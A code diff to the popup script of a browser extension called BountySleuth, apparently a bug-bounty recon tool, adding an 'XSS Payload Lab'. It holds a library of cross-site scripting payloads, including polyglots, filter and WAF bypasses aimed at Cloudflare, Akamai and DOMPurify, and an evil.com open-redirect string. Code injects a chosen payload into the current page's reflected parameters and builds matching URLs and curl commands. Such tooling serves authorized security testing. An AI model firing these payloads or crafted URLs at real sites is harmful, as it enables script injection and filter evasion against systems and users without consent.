@@ -2,6 +2,98 @@
 // BountySleuth v2.0 - Popup Controller
 // ============================================================
 
+// ---- XSS Payload Lab state ----
+let _currentTabUrl = '';
+let _xssLabSelectedPayload = '';
+let _xssLabSelectedParam = '';
+let _xssLabCurrentCat = 'basic';
+
+const XSS_PAYLOAD_LIBRARY = {
+    basic: {
+        label: 'Basic',
+        payloads: [
+            { label: 'Script Alert',    code: '<script>alert(document.domain)</script>' },
+            { label: 'IMG onerror',     code: '<img src=x onerror=alert(1)>' },
+            { label: 'SVG onload',      code: '<svg onload=alert(1)>' },
+            { label: 'Body onload',     code: '<body onload=alert(1)>' },
+            { label: 'Details toggle',  code: '<details open ontoggle=alert(1)>' },
+            { label: 'Video onerror',   code: '<video src=x onerror=alert(1)>' },
+            { label: 'Autofocus',       code: '<input autofocus onfocus=alert(1)>' },
+            { label: 'A href JS',       code: '<a href="javascript:alert(1)">click</a>' },
+        ]
+    },
+    attr: {
+        label: 'Attribute',
+        payloads: [
+            { label: 'Break " + SVG',   code: '"><svg/onload=alert(1)>' },
+            { label: "Break ' + SVG",   code: "'><svg/onload=alert(1)>" },
+            { label: 'Autofocus focus', code: '" autofocus onfocus="alert(1)' },
+            { label: 'Onmouseover',     code: '" onmouseover="alert(1)' },
+            { label: 'Onclick',         code: '" onclick="alert(1)' },
+            { label: 'Onkeyup',        code: '" onkeyup="alert(1)' },
+            { label: 'Animation start', code: '" style="animation-name:x" onanimationstart="alert(1)' },
+        ]
+    },
+    script: {
+        label: 'Script Ctx',
+        payloads: [
+            { label: "Break '",         code: "'-alert(1)-'" },
+            { label: 'Break "',         code: '"-alert(1)-"' },
+            { label: 'Comment break',   code: '";alert(1);//' },
+            { label: 'Template',        code: '`${alert(1)}`' },
+            { label: 'Close bracket',   code: '});alert(1);//' },
+            { label: 'Semicolon',       code: ';alert(document.domain)//' },
+        ]
+    },
+    polyglot: {
+        label: 'Polyglot',
+        payloads: [
+            { label: 'Classic',         code: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e" },
+            { label: 'Short multi-ctx', code: '\'"--><script>alert(1)</script><img src=x onerror=alert(1)>' },
+            { label: 'Context chain',   code: ';alert(1)//\';alert(1)//";alert(1)//' },
+            { label: 'Atomic',          code: '\'\";alert(1)//<b onmouseover=alert(1)>xss' },
+            { label: 'All angles',      code: '"><\'><script>alert(1)</script><img src=x onerror=alert(1)>' },
+        ]
+    },
+    bypass: {
+        label: 'Filter Bypass',
+        payloads: [
+            { label: 'Case mix',        code: '<ScRiPt>alert(1)</sCrIpT>' },
+            { label: 'Null byte',       code: '<scr\x00ipt>alert(1)</script>' },
+            { label: 'Double encode',   code: '%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E' },
+            { label: 'Tab separator',   code: '<img\tsrc=x\tonerror=alert(1)>' },
+            { label: 'Newline sep',     code: '<img\nsrc=x\nonerror=alert(1)>' },
+            { label: 'Base64 eval',     code: '<img src=x id=YWxlcnQoMSk= onerror=eval(atob(this.id))>' },
+            { label: 'Unicode escape',  code: '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e' },
+            { label: 'Vertical tab',    code: '<img\x0csrc=x\x0conerror=alert(1)>' },
+        ]
+    },
+    dom: {
+        label: 'DOM / URL',
+        payloads: [
+            { label: 'Hash inject',     code: '#<img src=x onerror=alert(1)>' },
+            { label: 'JS protocol',     code: 'javascript:alert(document.domain)' },
+            { label: 'Data URI',        code: 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==' },
+            { label: 'Angular SSTI',    code: "{{constructor.constructor('alert(1)')()" + '}' + '}' },
+            { label: 'Vue SSTI',        code: "{{_c.constructor('alert(1)')()" + '}' + '}' },
+            { label: 'Template ${',     code: '${alert(1)}' },
+            { label: 'Open redirect',   code: '//evil.com/%0D%0A<script>alert(1)</script>' },
+        ]
+    },
+    waf: {
+        label: 'WAF Bypass',
+        payloads: [
+            { label: 'CF Base64 eval',  code: '<svg onload=eval(atob("YWxlcnQoMSk="))>' },
+            { label: 'CF double-enc',   code: '%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E' },
+            { label: 'DOMPurify mXSS',  code: '<math><mtext><table><mglyph><style><math><table id="</table>"><img src onerror=alert(1)">' },
+            { label: 'DOMPurify nest',  code: '<svg><style><g title="</style><script>alert(1)</script>">' },
+            { label: 'Regex null byte', code: '<scr%00ipt>alert(1)</script>' },
+            { label: 'Akamai bypass',   code: "<svg/onload='javascript:alert(1)'>" },
+            { label: 'Whitespace mix',  code: '<img\x0csrc=x\x0conerror=alert(1)>' },
+        ]
+    }
+};
+
 document.addEventListener('DOMContentLoaded', () => {
     // Toggle sections
     document.querySelectorAll('.toggle').forEach(header => {
@@ -23,24 +115,69 @@ document.addEventListener('DOMContentLoaded', () => {
 
         const url = new URL(tab.url);
         const host = url.hostname;
+        _currentTabUrl = tab.url;
         document.getElementById('targetUrl').textContent = host;
 
-        loadData(host);
+        // Check if we already have scan data for this host
+        chrome.storage.local.get([host], (result) => {
+            const data = result[host];
+            if (data && data.lastScan) {
+                // Data exists — show it immediately
+                loadData(host);
+            } else {
+                // No data yet — trigger a scan and poll for results
+                document.getElementById('lastScan').textContent = 'Scanning…';
+                chrome.tabs.sendMessage(tab.id, { action: 'rescan' }, () => {
+                    // Allow up to 30s for scan to complete (source map fetches can be slow)
+                    let attempts = 0;
+                    const maxAttempts = 38; // 38 × 800ms = ~30s
+                    const poll = setInterval(() => {
+                        attempts++;
+                        chrome.storage.local.get([host], (res) => {
+                            const d = res[host];
+                            if ((d && d.lastScan) || attempts >= maxAttempts) {
+                                clearInterval(poll);
+                                loadData(host);
+                            }
+                        });
+                    }, 800);
+                });
+            }
+        });
     });
 
     // Rescan
     document.getElementById('rescanBtn').addEventListener('click', () => {
         chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
-            chrome.tabs.sendMessage(tabs[0].id, { action: 'rescan' });
-            setTimeout(() => window.location.reload(), 600);
+            const tab = tabs[0];
+            const host = new URL(tab.url).hostname;
+            const btn = document.getElementById('rescanBtn');
+            btn.textContent = '⏳ Scanning…';
+            btn.disabled = true;
+
+            // Safety fallback in case content script doesn't respond
+            const fallback = setTimeout(() => {
+                loadData(host);
+                btn.textContent = '⟳ Rescan';
+                btn.disabled = false;
+            }, 35000);
+
+            chrome.tabs.sendMessage(tab.id, { action: 'rescan' }, (response) => {
+                clearTimeout(fallback);
+                // Small delay for storage to flush
+                setTimeout(() => {
+                    loadData(host);
+                    btn.textContent = '⟳ Rescan';
+                    btn.disabled = false;
+                }, 300);
+            });
         });
     });
 
     // Export
     document.getElementById('exportBtn').addEventListener('click', () => {
         chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
-            const url = new URL(tabs[0].url);
-            const host = url.hostname;
+            const host = new URL(tabs[0].url).hostname;
             chrome.storage.local.get([host], (result) => {
                 const data = result[host] || {};
                 const report = generateReport(host, data);
@@ -52,8 +189,7 @@ document.addEventListener('DOMContentLoaded', () => {
     // Export JSON
     document.getElementById('exportJsonBtn').addEventListener('click', () => {
         chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
-            const url = new URL(tabs[0].url);
-            const host = url.hostname;
+            const host = new URL(tabs[0].url).hostname;
             chrome.storage.local.get([host], (result) => {
                 const data = result[host] || {};
                 copyToClipboard(JSON.stringify(data, null, 2), 'exportJsonBtn');
@@ -64,9 +200,10 @@ document.addEventListener('DOMContentLoaded', () => {
     // Clear
     document.getElementById('clearBtn').addEventListener('click', () => {
         chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
-            const url = new URL(tabs[0].url);
-            chrome.storage.local.remove(url.hostname, () => {
-                window.location.reload();
+            const host = new URL(tabs[0].url).hostname;
+            chrome.storage.local.remove(host, () => {
+                // Reset UI counts without full page reload
+                loadData(host);
             });
         });
     });
@@ -74,6 +211,59 @@ document.addEventListener('DOMContentLoaded', () => {
     // Analyze NPM Packages
     document.getElementById('analyzePackagesBtn').addEventListener('click', () => {
         triggerNpmAnalysis();
+    });
+
+    // XSS Payload Lab
+    document.getElementById('xssLabBtn').addEventListener('click', () => {
+        chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
+            if (!tabs[0]) return;
+            const host = new URL(tabs[0].url).hostname;
+            _currentTabUrl = tabs[0].url;
+            chrome.storage.local.get([host], (result) => {
+                openXSSLab(result[host] || {});
+            });
+        });
+    });
+
+    document.getElementById('xssLabCloseBtn').addEventListener('click', () => {
+        document.getElementById('xssLabOverlay').classList.add('hidden');
+    });
+
+    document.getElementById('xssLabOverlay').addEventListener('click', (e) => {
+        if (e.target === document.getElementById('xssLabOverlay')) {
+            document.getElementById('xssLabOverlay').classList.add('hidden');
+        }
+    });
+
+    document.getElementById('xssLabCopyPayload').addEventListener('click', () => {
+        if (!_xssLabSelectedPayload) return;
+        const btn = document.getElementById('xssLabCopyPayload');
+        navigator.clipboard.writeText(_xssLabSelectedPayload).catch(() => {});
+        btn.textContent = '✓ Copied!';
+        setTimeout(() => { btn.textContent = '📋 Copy Payload'; }, 1500);
+    });
+
+    document.getElementById('xssLabCopyUrl').addEventListener('click', () => {
+        const url = document.getElementById('xssLabCraftedUrl').textContent;
+        const btn = document.getElementById('xssLabCopyUrl');
+        navigator.clipboard.writeText(url).catch(() => {});
+        btn.textContent = '✓ Copied!';
+        setTimeout(() => { btn.textContent = '📋 Copy URL'; }, 1500);
+    });
+
+    document.getElementById('xssLabOpenTab').addEventListener('click', () => {
+        const url = document.getElementById('xssLabCraftedUrl').textContent;
+        if (url && url.startsWith('http')) {
+            chrome.tabs.create({ url });
+        }
+    });
+
+    document.getElementById('xssLabCopyCurl').addEventListener('click', () => {
+        const curl = document.getElementById('xssLabCraftedCurl').textContent;
+        const btn = document.getElementById('xssLabCopyCurl');
+        navigator.clipboard.writeText(curl).catch(() => {});
+        btn.textContent = '✓ Copied!';
+        setTimeout(() => { btn.textContent = '📋 Copy cURL'; }, 1500);
     });
 });
 
@@ -347,6 +537,11 @@ function renderXSS(data) {
         return;
     }
 
+    const note = document.createElement('li');
+    note.style.cssText = 'font-size:10px;color:var(--text-muted);border:none;background:none;padding:2px 0 6px 0;';
+    note.textContent = '🟢 No client-side restrictions (test server-side)  🟡 Partial checks  🔴 Protected client-side';
+    list.appendChild(note);
+
     xss.forEach(x => {
         const issues = x.issues ? x.issues.join(', ') : 'no maxlength';
         const isReflected = x.type === 'reflected';
@@ -354,10 +549,7 @@ function renderXSS(data) {
         const sev = x.severity ? x.severity.toLowerCase() : 'medium';
         const li = createListItem(text, sev);
         li.appendChild(createSevTag(x.severity || 'MEDIUM'));
-
-        // Advanced Payload UI for injection vectors (Aware of WAF and JS Protections)
         appendPayloadUI(li, isReflected ? ['TEXT', 'ATTR'] : ['ATTR'], data);
-
         list.appendChild(li);
     });
 }
@@ -382,10 +574,13 @@ function renderDOMSinks(data) {
     });
 }
 
-// ---- Reflected Params (v3.2 Smart Payloads) ----
+// ---- Reflected Params ----
 function renderReflected(data) {
     const reflected = data.reflected_params || [];
-    setCount('reflectedCount', reflected.length, reflected.length > 0 ? 'critical' : null);
+
+    // Bump count badge to critical if any confirmed XSS
+    const hasConfirmed = reflected.some(r => r.probe && r.probe.confirmed === true);
+    setCount('reflectedCount', reflected.length, reflected.length > 0 ? (hasConfirmed ? 'critical' : 'high') : null);
 
     const list = document.getElementById('reflectedlist');
     if (reflected.length === 0) {
@@ -394,16 +589,42 @@ function renderReflected(data) {
     }
 
     reflected.forEach(r => {
-        const chars = r.unencoded && r.unencoded.length > 0 ? `\nUnencoded: ${r.unencoded.join(' ')}` : '';
-        const text = `Param: ${r.param} = "${r.value}"\nContext: ${r.contexts.join(', ')}${chars}`;
-        const sev = r.severity ? r.severity.toLowerCase() : 'high';
+        const chars = r.unencoded && r.unencoded.length > 0 ? `\nUnencoded chars: ${r.unencoded.join(' ')}` : '';
 
+        // Probe result line
+        let probeText = '';
+        let probeBadge = null;
+        if (r.probe) {
+            if (r.probe.confirmed === true) {
+                probeText = `\n✅ CONFIRMED XSS — ${r.probe.reason}`;
+                probeBadge = { text: '✅ CONFIRMED', bg: 'rgba(63,185,80,0.15)', border: 'var(--success)', color: 'var(--success)' };
+            } else if (r.probe.confirmed === false) {
+                probeText = `\n🛡 Sanitized — ${r.probe.reason}`;
+                probeBadge = { text: '🛡 Sanitized', bg: 'rgba(139,148,158,0.1)', border: 'var(--text-muted)', color: 'var(--text-muted)' };
+            } else {
+                probeText = `\n⚠️ Probe error: ${r.probe.reason}`;
+            }
+        } else {
+            probeText = '\n⏳ Probing for XSS…';
+            probeBadge = { text: '⏳ Probing', bg: 'rgba(88,166,255,0.1)', border: 'var(--accent)', color: 'var(--accent)' };
+        }
+
+        const text = `Param: ${r.param} = "${r.value}"\nContext: ${r.contexts.join(', ')}${chars}${probeText}`;
+
+        // Elevate severity if confirmed
+        const sev = (r.probe && r.probe.confirmed === true) ? 'critical' : (r.severity ? r.severity.toLowerCase() : 'high');
         const li = createListItem(text, sev);
+
+        if (probeBadge) {
+            const badge = document.createElement('span');
+            badge.className = 'sev-tag';
+            badge.style.cssText = `background:${probeBadge.bg};border:1px solid ${probeBadge.border};color:${probeBadge.color};margin-left:4px;`;
+            badge.textContent = probeBadge.text;
+            li.appendChild(badge);
+        }
+
         li.appendChild(createSevTag(r.severity || 'HIGH'));
-
-        // Advanced Payload UI (Aware of WAF and JS Protections)
         appendPayloadUI(li, r.contexts, data);
-
         list.appendChild(li);
     });
 }
@@ -538,6 +759,135 @@ function appendPayloadUI(parentElement, contexts, data) {
     });
 
     parentElement.appendChild(box);
+}
+
+// ---- XSS Payload Lab ----
+function openXSSLab(data) {
+    _xssLabSelectedPayload = '';
+    _xssLabCurrentCat = 'basic';
+
+    // Build target dropdown — reflected URL params first, then input fields
+    const select = document.getElementById('xssLabTarget');
+    select.innerHTML = '';
+
+    (data.reflected_params || []).forEach(r => {
+        const opt = document.createElement('option');
+        opt.value = 'param:' + r.param;
+        opt.textContent = `🔄 ${r.param}  (reflected URL param — ${r.severity})`;
+        select.appendChild(opt);
+    });
+
+    (data.xss || []).forEach(x => {
+        const opt = document.createElement('option');
+        opt.value = 'field:' + x.name;
+        opt.textContent = `💉 ${x.name}  (input field — ${x.severity})`;
+        select.appendChild(opt);
+    });
+
+    if (select.options.length === 0) {
+        const opt = document.createElement('option');
+        opt.value = 'none';
+        opt.textContent = '— no targets detected (paste your own URL) —';
+        select.appendChild(opt);
+    }
+
+    _xssLabSelectedParam = select.value;
+    select.onchange = () => {
+        _xssLabSelectedParam = select.value;
+        updateXSSLabOutput();
+    };
+
+    _xssLabRenderCats();
+    _xssLabRenderPayloads();
+    updateXSSLabOutput();
+
+    document.getElementById('xssLabOverlay').classList.remove('hidden');
+}
+
+function _xssLabRenderCats() {
+    const catsEl = document.getElementById('xssLabCats');
+    catsEl.innerHTML = '';
+    Object.keys(XSS_PAYLOAD_LIBRARY).forEach(cat => {
+        const btn = document.createElement('button');
+        btn.className = 'xss-cat-btn' + (cat === _xssLabCurrentCat ? ' active' : '');
+        btn.textContent = XSS_PAYLOAD_LIBRARY[cat].label;
+        btn.onclick = () => {
+            _xssLabCurrentCat = cat;
+            document.querySelectorAll('.xss-cat-btn').forEach(b => b.classList.remove('active'));
+            btn.classList.add('active');
+            _xssLabSelectedPayload = '';
+            _xssLabRenderPayloads();
+        };
+        catsEl.appendChild(btn);
+    });
+}
+
+function _xssLabRenderPayloads() {
+    const list = document.getElementById('xssLabPayloads');
+    list.innerHTML = '';
+    const payloads = XSS_PAYLOAD_LIBRARY[_xssLabCurrentCat].payloads;
+
+    payloads.forEach((p, i) => {
+        const row = document.createElement('div');
+        row.className = 'xss-payload-row';
+
+        const lbl = document.createElement('span');
+        lbl.className = 'xss-payload-row-label';
+        lbl.textContent = p.label;
+
+        const code = document.createElement('span');
+        code.className = 'xss-payload-row-code';
+        code.textContent = p.code.length > 45 ? p.code.substring(0, 45) + '…' : p.code;
+        code.title = p.code;
+
+        row.appendChild(lbl);
+        row.appendChild(code);
+
+        row.onclick = () => {
+            document.querySelectorAll('.xss-payload-row').forEach(r => r.classList.remove('selected'));
+            row.classList.add('selected');
+            _xssLabSelectedPayload = p.code;
+            updateXSSLabOutput();
+        };
+
+        list.appendChild(row);
+
+        // Auto-select first payload
+        if (i === 0) {
+            row.classList.add('selected');
+            _xssLabSelectedPayload = p.code;
+        }
+    });
+
+    updateXSSLabOutput();
+}
+
+function updateXSSLabOutput() {
+    document.getElementById('xssLabSelectedCode').textContent = _xssLabSelectedPayload || '— select a payload above —';
+
+    const target = _xssLabSelectedParam || '';
+    const payload = _xssLabSelectedPayload || '';
+
+    let craftedUrl = '';
+    let craftedCurl = '';
+
+    if (target.startsWith('param:') && payload && _currentTabUrl) {
+        const paramName = target.slice(6);
+        try {
+            const u = new URL(_currentTabUrl);
+            u.searchParams.set(paramName, payload);
+            craftedUrl = u.href;
+        } catch (e) {
+            craftedUrl = _currentTabUrl + '?' + paramName + '=' + encodeURIComponent(payload);
+        }
+        craftedCurl = `curl -sk "${craftedUrl.replace(/"/g, '\\"')}" -H "User-Agent: Mozilla/5.0"`;
+    } else if (payload) {
+        craftedUrl = '(select a reflected URL param as target to auto-craft)';
+        craftedCurl = `curl -sk "<url>?<param>=${encodeURIComponent(payload)}" -H "User-Agent: Mozilla/5.0"`;
+    }
+
+    document.getElementById('xssLabCraftedUrl').textContent = craftedUrl || '—';
+    document.getElementById('xssLabCraftedCurl').textContent = craftedCurl || '—';
 }
 
 // ---- PostMessages ----
